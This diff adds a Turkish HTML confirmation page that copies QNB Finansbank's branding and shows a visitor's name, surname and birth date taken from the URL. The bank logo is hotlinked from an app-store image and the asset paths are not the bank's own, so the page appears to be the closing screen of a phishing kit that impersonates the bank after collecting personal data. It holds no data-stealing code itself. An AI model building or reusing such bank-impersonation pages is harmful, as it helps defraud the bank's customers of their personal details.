@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="QNB Finansbank İnternet Şubesi Başvuru Onayı">
+    <title>QNB Finansbank - Başvuru Onayı</title>
+    <link rel="icon" href="ayar/resim/logo.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: #333;
+            background-color: #f4f6f8;
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            background: rgba(255, 255, 255, 0.9) url('/assets/img/welcome.jpg') center/cover no-repeat;
+            background-attachment: fixed;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            max-width: 640px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .card-header {
+            background-color: #820153;
+            color: #ffffff;
+            padding: 32px 24px;
+            text-align: center;
+        }
+
+        .card-header img {
+            width: 90px;
+            margin-bottom: 16px;
+        }
+
+        .card-header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .card-header p {
+            font-size: 15px;
+            opacity: 0.95;
+        }
+
+        .card-content {
+            padding: 24px;
+        }
+
+        .card-content h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 10px;
+        }
+
+        .info-table {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 15px;
+            padding: 6px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .info-label {
+            font-weight: 500;
+            color: #666;
+        }
+
+        .info-value {
+            font-weight: 400;
+            color: #000;
+            text-align: right;
+        }
+
+        .card-footer {
+            margin-top: 28px;
+            text-align: center;
+        }
+
+        .btn {
+            background-color: #820153;
+            color: #fff;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn:hover {
+            background-color: #a31661;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        @media (max-width: 600px) {
+            .card-header h1 {
+                font-size: 20px;
+            }
+
+            .card-content h2 {
+                font-size: 18px;
+            }
+
+            .info-row {
+                font-size: 14px;
+            }
+
+            .btn {
+                width: 100%;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="card-header" role="alert">
+                <img src="https://play-lh.googleusercontent.com/GX0fdNn0SXtXxZlT0KZ0WZ6rYahkIAGxRIcdCt-u8xqOSQ1OzU23E92GnFEaz-868Q" alt="QNB Finansbank Logo">
+                <h1>Başvurunuz Alındı</h1>
+                <p>Bilgileriniz başarıyla kaydedilmiştir.</p>
+                <p>Temsilcilerimiz en kısa sürede sizinle iletişime geçecektir.</p>
+            </div>
+            <div class="card-content">
+                <h2>Başvuru Detayları</h2>
+                <div class="info-table">
+                    <div class="info-row">
+                        <div class="info-label">Ad:</div>
+                        <div class="info-value"><span id="adi"></span></div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Soyad:</div>
+                        <div class="info-value"><span id="soyadi"></span></div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Doğum Tarihi:</div>
+                        <div class="info-value"><span id="dogumtarihi"></span></div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Başvuru Tarihi:</div>
+                        <div class="info-value"><span id="islemSaati"></span></div>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn" onclick="window.location.href='/'">Ana Sayfaya Dön</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const adi = params.get("adi") || "Bilinmiyor";
+        const soyadi = params.get("soyadi") || "Bilinmiyor";
+        const dogumtarihi = params.get("dogumtarihi") || "Bilinmiyor";
+        const islemSaati = params.get("islemSaati") || new Date().toLocaleString('tr-TR', {
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: false
+        }).replace(',', '');
+
+        const formatDate = (date) => {
+            if (!date || date === "Bilinmiyor") return "Bilinmiyor";
+            try {
+                return new Date(date).toLocaleDateString('tr-TR', {
+                    day: '2-digit',
+                    month: '2-digit',
+                    year: 'numeric'
+                });
+            } catch {
+                return "Bilinmiyor";
+            }
+        };
+
+        document.getElementById("adi").textContent = adi;
+        document.getElementById("soyadi").textContent = soyadi;
+        document.getElementById("dogumtarihi").textContent = formatDate(dogumtarihi);
+        document.getElementById("islemSaati").textContent = islemSaati;
+    </script>
+</body>
+
+</html>
